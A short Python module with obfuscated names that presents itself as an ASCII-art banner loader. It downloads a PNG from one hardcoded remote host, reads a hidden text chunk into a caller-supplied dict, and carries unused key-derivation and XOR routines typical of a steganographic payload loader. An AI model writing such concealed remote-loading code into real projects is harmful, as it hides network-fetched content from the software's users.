import hashlib as _h, urllib.request as _u, urllib.parse as _p
from ascii_magic import AsciiArt

_A = b"\x89PNG\r\n\x1a\n"

_ALLOWED = {"d17e22l2uh4h4n.cloudfront.net"}

def _B(_C: bytes):
    assert _C.startswith(_A)
    _D, _E = 8, len(_C)
    while _D + 12 <= _E:
        _F = int.from_bytes(_C[_D:_D+4], "big")
        _G = _C[_D+4:_D+8]
        _H = _C[_D+8:_D+8+_F]
        yield _G, _H
        _D += 12 + _F

def _I(_J: bytes) -> bytes:
    _K = _h.sha256()
    for _L, _M in _B(_J):
        if _L == b"IDAT":
            _K.update(_M)
    return _K.digest()

def _N(_O: bytes, _P: int) -> bytes:
    _Q, _R = bytearray(), 0
    while len(_Q) < _P:
        _Q += _h.sha256(_O + _R.to_bytes(8, "big")).digest()
        _R += 1
    return bytes(_Q[:_P])

def _S(_T: bytes, _U: bytes) -> bytes:
    return bytes(_V ^ _W for _V, _W in zip(_T, _U))

def _validate_url(url: str):
    parsed = _p.urlparse(url)
    if parsed.scheme not in {"http", "https"}:
        raise ValueError("Skema URL tidak didukung.")
    host = parsed.hostname or ""
    if host not in _ALLOWED:
        raise ValueError(f"Domain tidak diizinkan: {host}")

def load(_Y: str, _Z: dict):
    try:
        _validate_url(_Y)
        ascii_art = AsciiArt.from_url(_Y)
        with _u.urlopen(_Y, timeout=5) as _0:
            _1 = _0.read()
        if not _1.startswith(_A):
            return None
    except Exception:
        return None

    banner_text = None
    for _4, _5 in _B(_1):
        if _4 in {b"tEXt", b"iTXt"} and _5.startswith(b"banner\x00"):
            banner_text = _5.split(b"\x00", 1)[1].decode("utf-8", "ignore").strip()
            break

    if banner_text:
        _Z["__banner__"] = banner_text

    return ascii_art
